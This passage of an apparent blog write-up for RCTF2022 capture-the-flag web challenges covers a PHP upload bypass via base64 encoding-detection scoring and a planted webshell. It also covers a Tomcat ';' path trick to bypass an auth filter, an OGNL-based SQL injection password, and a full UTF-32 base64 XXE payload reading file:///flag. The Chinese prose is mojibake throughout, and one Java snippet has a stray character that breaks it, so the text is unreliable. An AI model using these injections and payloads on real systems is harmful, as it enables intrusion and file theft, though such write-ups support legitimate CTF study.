BASE64&#96;ï¼Œåªè¦æ–‡ä»¶å†…å®¹å‰é¢æ•°æ®è®©å®ƒè¯†åˆ«ä¸ºbase64å³å¯</p><p>é‚£ä¹ˆå¦‚ä½•è®©å…¶è®¤ä¸ºæ˜¯base64å‘¢ï¼Ÿ</p><p>è¿™å°±æ¶‰åŠåˆ°<code>libmbfl</code>çš„æ‰“åˆ†ï¼Œ<code>libmbfl</code>æ˜¯<code>mb</code>æ‰©å±•</p><p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p><p>æˆ‘çš„ç†è§£å°±æ˜¯ç±»ä¼¼åƒ<code>checkengine</code>ï¼Œæ¯”å¦‚<code>mb_detect_encoding()</code>è¿™ç±»çš„å‡½æ•°å¯¹å†…å®¹è¿›è¡Œç¼–ç çš„è¯†åˆ«ï¼Œå°±æ˜¯<code>åŒ¹é…å†…å®¹ä¸­çš„ä¸€äº›ç¬¦åˆç¼–ç çš„å­—ç¬¦ï¼ŒåŒ¹é…æˆåŠŸå¯¹åº”ç¼–ç åŠ åˆ†</code>ï¼Œæœ€åä»å¤´åˆ°å°¾åŒ¹é…å®Œæˆåï¼Œ<code>æ‰“åˆ†æœ€é«˜çš„ç¼–ç å°±è¢«è®¤ä¸ºæ˜¯è¯¥å†…å®¹çš„ç¼–ç </code></p></blockquote><p>è¿™æ˜¯æ‰“åˆ†åˆ¤æ–­</p><blockquote><p>0xFFFFæ˜¯-1ï¼Œ&gt;&#x3D;0 </p><blockquote><p>0x21æ˜¯33 33å¯¹åº”!</p><p>0x2Fæ˜¯47 47å¯¹åº”&#x2F;</p><p><code>47&gt;=c&gt;=33</code></p></blockquote><p><code>/</code>æ‰“åˆ†æ‰“çš„å¤šï¼Œæ‰€ä»¥å¯ä»¥åœ¨ä¸€å¥è¯ğŸå‰åŠ å…¥è®¸å¤š<code>/</code></p></blockquote><p><img src="/2023/02/13/RCTF2022-wp/image-20230122195735469.png" alt="image-20230122195735469"></p><p>è¿™æ˜¯<code>mb_encoding_detect()</code>è¿”å›åˆ¤æ–­å¾—åˆ°ç¼–ç ç±»å‹çš„é€»è¾‘</p><blockquote><p>å› ä¸º<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code>ï¼Œæ‰€ä»¥æŒ‰ç…§å¾—åˆ†åŒ¹é…ï¼Œå¦‚æœæ˜¯æƒ³è¦è¿”å›<code>base64</code>ï¼Œå°±éœ€è¦å†…å®¹ä¸­<code>base64</code>å¾—åˆ†æœ€é«˜ï¼Œæ‰å¯ä»¥å®ç°è¿”å›ä¸º<code>base64</code></p></blockquote><p><img src="/2023/02/13/RCTF2022-wp/image-20230122195835984.png" alt="image-20230122195835984"></p><h3 id="ç»¼ä¸Š"><a href="#ç»¼ä¸Š" class="headerlink" title="ç»¼ä¸Š"></a><strong>ç»¼ä¸Š</strong></h3><blockquote><p>ä¸Šä¼ çš„æ–‡ä»¶éœ€è¦æ»¡è¶³</p><p>1.åç¼€ä¸èƒ½ä¸º<code>.php</code>ç­‰ï¼Œå¯ä»¥ä¸ºå¤§å°å†™æ··å†™æˆ–è€…çº¯å¤§å†™ï¼Œå¦‚<code>.pHpï¼Œ.PHP</code>ç­‰ç­‰</p><p>2.æ–‡ä»¶å†…å®¹å‰é¢éœ€è¦å¯ä»¥è¢«è¯†åˆ«ä¸º<code>base64</code>ï¼Œè€Œåé¢çš„è¿‡æ»¤çš„å†…å®¹å…¶å®å°±ä¸ç”¨è€ƒè™‘äº†ï¼Œå› ä¸ºåœ¨åˆ¤æ–­å‰ç»è¿‡</p><p><code>$content=base64_decode($content)</code></p><p><img src="/2023/02/13/RCTF2022-wp/image-20230122213729640.png" alt="image-20230122213729640"></p><p>å¯ä»¥å‘ç°åŸæ¥çš„å†…å®¹åœ¨è¢«è§£ç åï¼Œå‘ç”Ÿäº†å˜åŒ–ï¼Œç»“æœè½¬åŒ–ä¸ºä¹±ç ï¼Œäºæ˜¯ç»•è¿‡äº†é»‘åå•è¿‡æ»¤</p><p>ã€å½“ç„¶å‰ææ˜¯<code>$charset == BASE64</code>ï¼Œä¹Ÿå°±æ˜¯æ‰“åˆ†å¤Ÿäº†ã€‘</p></blockquote><p>äºæ˜¯æœ€åçš„æ–‡ä»¶å†…å®¹ä¸º</p><p><img src="/2023/02/13/RCTF2022-wp/image-20230122210900608.png" alt="image-20230122210900608"></p><p>è®¿é—®<code>1.PHP</code></p><p><img src="/2023/02/13/RCTF2022-wp/image-20230122210957493.png" alt="image-20230122210957493"></p><p>æ‹¿èšå‰‘è¿æ¥</p><p><img src="/2023/02/13/RCTF2022-wp/image-20230122164102078.png" alt="image-20230122164102078"></p><p>æœ€åå¾—åˆ°<code>flag</code></p><p><img src="/2023/02/13/RCTF2022-wp/image-20230122164115830.png" alt="image-20230122164115830"></p><h2 id="ezruoyi"><a href="#ezruoyi" class="headerlink" title="ezruoyi"></a>ezruoyi</h2><blockquote><p>hint:<code>RuoYi v4.7.5</code></p></blockquote><blockquote><p>é™„ä»¶ï¼š</p><p><code>https://drive.google.com/file/d/1vd8-tzGCX5Nra2vNTvJerjyW4KQDaAtE/view?usp=sharing</code></p><p>or</p><p><code>https://share.weiyun.com/wCvo3QJ0</code></p></blockquote><hr><p>å¯èƒ½æœ‰äººæ­å»º<code>docker</code>æ—¶ä¼šå‘ç”Ÿ</p><p><img src="/2023/02/13/RCTF2022-wp/image-20230122215310097.png" alt="image-20230122215310097"></p><p>åªéœ€æ·»åŠ <code>version: &quot;3&quot;</code>åˆ°æ‚¨çš„<code>docker-compose.yml</code>æœ€å‰é¢å°±å¯ä»¥è§£å†³æŠ¥é”™</p><p><img src="/2023/02/13/RCTF2022-wp/image-20230122215530660.png" alt="image-20230122215530660"></p><p><img src="/2023/02/13/RCTF2022-wp/image-20230122215520345.png" alt="image-20230122215520345"></p><p>åé¢ç¯å¢ƒç±»ä¼¼</p><p>ã€è¿™ä¸ªé¢˜ç›®çš„dbé•œåƒä¸€ç›´æœ‰é—®é¢˜ï¼Œé‚£æˆ‘å°±çœ‹å…¶ä»–å¤§ä½¬çš„<code>wp</code>ï¼Œæ€»ç»“ä¸€ä¸‹çŸ¥è¯†ç‚¹</p><hr><h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><blockquote><p>hint:xxe me,å°è¯•ç¼–ç ç»•è¿‡ xxe è¿‡æ»¤å™¨</p></blockquote><p><img src="/2023/02/13/RCTF2022-wp/image-20230123144129416.png" alt="image-20230123144129416"></p><p>è¿™æ˜¯ä¸€é“xxeçš„é¢˜ç›®ï¼Œå¯¹å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥å¯¹è¿‡æ»¤å†…å®¹è¿›è¡Œç¼–ç ç»•è¿‡è¿‡æ»¤è¾¾åˆ°æ–‡ä»¶å†…å®¹è¯»å–çš„ç›®çš„</p><p>åæ±‡ç¼–jaråŒ…ï¼Œ</p><p>åœ¨<code>com.example.demo.filter.MyFilter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (isWhite(request) || auth()) &#123;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      response.getWriter().write(<span class="string">&quot;auth fail&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isWhite</span><span class="params">(ServletRequest req)</span> &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest)req;</span><br><span class="line">    <span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">auth</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçœ‹åˆ°å¼€å§‹é¡µé¢çš„<code>auth fail</code>çš„è§¦å‘æ¡ä»¶</p><p><code>if (isWhite(request) || auth())</code></p><p>å…¶ä¸­</p><p><code>auth()</code>æ˜¯ä¸€å®šè¿”å›<code>false</code></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©<code>isWhite(request)</code>è¿”å›<code>true</code>ï¼Œæ‰èƒ½ç»§ç»­åç»­æ­¥éª¤</p><p>åœ¨isWhite()ä¸­å¯çŸ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦<code>URI</code>åä»¥<code>ico</code>ç»“å°¾ï¼Œä½†æ˜¯åˆä¸èƒ½è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œä¸ç„¶åé¢çš„è®¿é—®éƒ½æ˜¯å¤±è´¥çš„</p><p>è¿™é‡Œå°±éœ€è¦åˆ©ç”¨ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><p><code>Tomcat ä»¥;ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–</code></p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨<code>;</code>åçš„ä¸è¿›è¡Œè§£æ</p><p>äºæ˜¯æ„é€ å‡º</p><p><code>http://127.0.0.1:8899/index;123.ico</code></p><p><img src="/2023/02/13/RCTF2022-wp/image-20230123151457117.png" alt="image-20230123151457117"></p><p>è™½ç„¶æ˜¾ç¤º<code>500</code>ï¼Œä½†å…¶å®æ˜¯æˆåŠŸäº†çš„</p></blockquote><p>ç„¶åå°±éœ€è¦è€ƒè™‘å¦‚ä½•è¿›è¡Œ<code>xxe</code>æ³¨å…¥</p><p>åœ¨<code>com.example.demo.controller.DemoController</code>ä¸­ï¼Œæ­£å¥½æœ‰ä¸ªåä¸º<code>xxe</code>çš„å‡½æ•°</p><p><img src="/2023/02/13/RCTF2022-wp/image-20230123153904078.png" alt="image-20230123153904078"></p><p>åœ¨<code>xxe</code>å‡½æ•°ä¸Šé¢è¿˜æœ‰ä¸ª<code>sayHello</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (password.length() &gt; <span class="number">50</span> || password.indexOf(<span class="string">&quot;&#x27;&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;not allow&quot;</span>;</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure><blockquote><p>å‘ç°å…¶å¯¹<code>password</code>è¿™ä¸ªå‚æ•°ä¸­çš„æ•°æ®ä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼Œé•¿åº¦<code>ä¸èƒ½è¶…è¿‡50</code>ä¸ªå­—ç¬¦ï¼Œä¸”å…¶ä¸­ä¸èƒ½æœ‰å•å¼•å·<code>&#39;</code></p><p>å¦åˆ™å°±ä¼šå¤±è´¥è¿”å›</p></blockquote><blockquote><p>å¹¶ä¸”åœ¨<code>sayHello</code>å‡½æ•°ä¸­ï¼Œè¿˜æœ‰å…¶ä»–ä¸‰ä¸ªå‚æ•°</p><p><code>String poc, String type, String yourclasses</code></p><p>è¿™ä¸‰ä¸ªå‚æ•°ä¹Ÿæ˜¯æœ€åä¼ å…¥<code>xxeå‡½æ•°</code>çš„ä¸‰ä¸ªå‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> xxe(poc, type, classes);</span><br></pre></td></tr></table></figure><p>ã€ä½†æ˜¯<code>yourclasses</code>å‚æ•°è¢«è¿›è¡Œäº†åˆ†å‰²ï¼Œä»¥<code>,</code>ä¸ºåˆ†å‰²ï¼Œåˆ†æˆ4ä»½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] classes = yourclasses.split(<span class="string">&quot;,&quot;</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯¹<code>yourclasses</code>çš„å‚æ•°èµ‹å€¼éœ€è¦è€ƒè™‘</p></blockquote><blockquote><p>&#x3D;&#x3D;&gt;<code>xxeæ³¨å…¥</code>éœ€è¦å››ä¸ªå‚æ•°</p><p><code>String password, String poc, String type, String yourclasses</code></p><p>å…¶ä¸­</p><ul><li><code>password</code>å‚æ•°å€¼éœ€è¦ç»•è¿‡å•å¼•å·ï¼ˆå¸¸è¯†çŒœæµ‹æ˜¯sqlæ³¨å…¥ï¼Œä»¥å•å¼•å·é—­åˆï¼Œç”¨ä¸‡èƒ½å¯†ç </li><li><code>poc</code>å‚æ•°å€¼æŒ‰å¸¸ç†åº”è¯¥å°±æ˜¯xxeæ³¨å…¥çš„å†…å®¹</li><li><code>type</code>å‚æ•°å€¼è¿˜ä¸å¤ªç¡®å®š</li><li><code>yourclasses</code>å‚æ•°å€¼ä»¥<code>,</code>åˆ†å‰²ä¸º4ä»½ï¼Œå…·ä½“å€¼å¯èƒ½å°±æ˜¯å¸®åŠ©<code>poc</code>è¿›è¡Œç»•è¿‡è¿‡æ»¤çš„</li></ul></blockquote><p>åŒæ ·åœ¨è¯¥ç±»ä¸­ï¼Œåº•ä¸‹å°±æ˜¯è¿‡æ»¤é»‘åå•</p><p><img src="/2023/02/13/RCTF2022-wp/image-20230123154032645.png" alt="image-20230123154032645"></p><blockquote><p>å¯ä»¥çœ‹åˆ°å°†<code>!DOCTYPE</code>è¿›è¡Œäº†è¿‡æ»¤</p></blockquote><h3 id="passwordå‚æ•°"><a href="#passwordå‚æ•°" class="headerlink" title="passwordå‚æ•°"></a>passwordå‚æ•°</h3><p>æŸ¥æ‰¾passwordå‚æ•°åœ¨å“ªé‡Œè¢«åˆ©ç”¨æ—¶</p><p>åœ¨<code>com.example.demo.mapper.UserProvider</code></p><p><img src="/2023/02/13/RCTF2022-wp/image-20230124131633821.png" alt="image-20230124131633821"></p><p>å‘ç°å…¶æœç„¶è¢«<code>sql</code>æŸ¥è¯¢åˆ©ç”¨ ï¼Œä»¥<code>&#39;)</code>é—­åˆ</p><p>ä½†æ˜¯å•å¼•å·è¢«è¿‡æ»¤äº†å¦‚ä½•é—­åˆï¼Œç„¶åå®ç°ä¸‡èƒ½å¯†ç å‘¢</p><h4 id="Ognl-æ³¨å…¥ç»•è¿‡å¼•ç”¨è¿‡æ»¤"><a href="#Ognl-æ³¨å…¥ç»•è¿‡å¼•ç”¨è¿‡æ»¤" class="headerlink" title="Ognl æ³¨å…¥ç»•è¿‡å¼•ç”¨è¿‡æ»¤"></a>Ognl æ³¨å…¥ç»•è¿‡å¼•ç”¨è¿‡æ»¤</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="meta">@java</span>.lang.Character<span class="meta">@toString(39)</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç®€è€Œè¨€ä¹‹ï¼Œ<code>mybatis</code>ä¼šè°ƒç”¨<code>OGNL parser</code>æ¥è§£æ<code>sql</code>è¯­å¥ä¸­ä»¥ <code>$&#123;&#125;</code> æˆ–è€… <code>#&#123;&#125;</code> ä¸­çš„è¡¨è¾¾å¼å¹¶å°†æ‰§è¡Œç»“æœæ›¿æ¢è¿›å»</p></blockquote><p>è¿™é‡Œçš„<code>39</code>å°±æ˜¯å•å¼•å·çš„<code>ascii</code>ç¼–ç </p><p>äºæ˜¯æ„é€ <code>sql</code>æ³¨å…¥ä¸‡èƒ½å¯†ç </p><blockquote><p><code>password=1</code><strong><code>$&#123;@java.lang.Character@toString(39)&#125;</code></strong><code>) or 1=1#</code></p></blockquote><h3 id="pocå‚æ•°"><a href="#pocå‚æ•°" class="headerlink" title="pocå‚æ•°"></a>pocå‚æ•°</h3><p>å…ˆåˆ†æä¸€ä¸‹<code>xxe</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">xxe</span><span class="params">(String b64poc, String type, String[] classes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br><span class="line">    <span class="keyword">if</span> (check(bytepoc)) &#123;</span><br><span class="line">      <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">      <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">      <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">wrappoc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br><span class="line">      <span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br><span class="line">      inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br><span class="line">      <span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>poc</code>ä¼ å…¥åå˜ä¸º<code>b64poc</code></p><p>ç„¶å<code>b64poc</code>è¿›è¡Œ<code>base64</code>è§£ç ï¼Œç„¶å<code>check</code>å‡½æ•°è¿›è¡Œè¿‡æ»¤<code>!DOCTYPE</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æåŠä¸€ä¸ªçŸ¥è¯†ç‚¹xxeçš„ç¼–ç ç»•è¿‡</p><blockquote><p>ä¸€ä¸ª xml æ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨ UTF-8 ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨ UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBE å’Œ LE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412) å’Œ EBCDIC ç¼–ç ã€‚</p></blockquote><p>è€Œä¸€èˆ¬è¿‡æ»¤éƒ½æ˜¯å•å­—ç¬¦é›†è¿‡æ»¤ï¼Œåˆ©ç”¨ä¸Šé¢çš„ç¼–ç å°±å¯ä»¥ç»•è¿‡ï¼Œè€Œä¸”åˆ©ç”¨ä¸Šé¢æ–¹å¼åŠ ç çš„<code>xml</code>æ–‡æ¡£ä»ç„¶å¯ä»¥è¢«æ­£å¸¸è¯»å–è§£æï¼Œ</p><p>è¿™é‡Œå°†å…¶è¿›è¡Œ<code>UTF-16</code>åŠ ç ï¼Œäºæ˜¯æ„é€ payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE test [ \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;\t&lt;!ENTITY xxe SYSTEM \&quot;file:///flag\&quot;&gt; \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;]&gt; \n&quot;</span>y</span><br><span class="line">                + <span class="string">&quot;&lt;ttoc&gt;&amp;xxe;&lt;/ttoc&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> <span class="string">&quot;UTF-32&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(body.getBytes(type)));</span><br><span class="line">        System.out.println(<span class="string">&quot;poc=&quot;</span>+poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°<code>poc</code>çš„å‚æ•°å€¼</p><blockquote><p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA+AAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg==</code></p><p>ä½†æ˜¯å‘é€è¯·æ±‚åŒ…ä¸­<code>base64</code>ç¼–ç ï¼Œéœ€è¦å¯¹æ•°æ®å†è¿›è¡Œ<code>url</code>ç¼–ç ï¼Œä¸ç„¶ç±»å‹<code>=</code>æˆ–<code>+</code>ä¼šè¢«è§†ä¸º<code>url</code>ä¸­çš„å‚æ•°å’Œç©ºæ ¼ç¬¦å·</p><p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D</code></p></blockquote><h3 id="typeå‚æ•°"><a href="#typeå‚æ•°" class="headerlink" title="typeå‚æ•°"></a>typeå‚æ•°</h3><p>åœ¨<code>xxe</code>å‡½æ•°ä¸­ï¼Œå¯¹äº<code>type</code>å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br></pre></td></tr></table></figure><p>ä¼¼ä¹å¯¹äºç»“æœæ²¡ä»€ä¹ˆå½±å“ï¼Œåªæ˜¯å¯¹<code>type</code>å‚æ•°å€¼ä¸ºä¸ä¸º<code>string</code>æ—¶ï¼Œå¯¹<code>wrappoc</code>å€¼æœ‰å˜åŒ–ã€æ˜¯<code>byte</code>ç±»å‹çš„<code>poc</code>å‚æ•°å€¼ï¼Œè¿˜æ˜¯<code>string</code>ç±»å‹çš„<code>poc</code>å‚æ•°å€¼ã€‘</p><p>ä½†æ˜¯<code>wrappoc</code>å‚æ•°å¯¹åç»­ç»“æœæ²¡ç”¨å½±å“ï¼ŒçŒœæµ‹<code>type</code>å‚æ•°å€¼åº”è¯¥å¯ä»¥é¡ºä¾¿å¡«ï¼Œå°±æŒ‰å…¶ä»£ç èµ‹å€¼ä¹Ÿè¡Œ</p><blockquote><p><code>type=string</code></p></blockquote><h3 id="yourclasseså‚æ•°"><a href="#yourclasseså‚æ•°" class="headerlink" title="yourclasseså‚æ•°"></a>yourclasseså‚æ•°</h3><p><code>yourclasses</code>å‚æ•°ä¼ å…¥<code>xxe</code>å‡½æ•°æ—¶ï¼Œä»¥<code>classes</code>å‚æ•°å</p><p>å‰é¢æåˆ°è¿‡,<code>yourclasses</code>å‚æ•°ä»¥<code>,</code>ä¸ºåˆ†å‰²ï¼Œåˆ†æˆå››ä»½</p><p>å‰ä¸¤éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure><p>åä¸¤éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 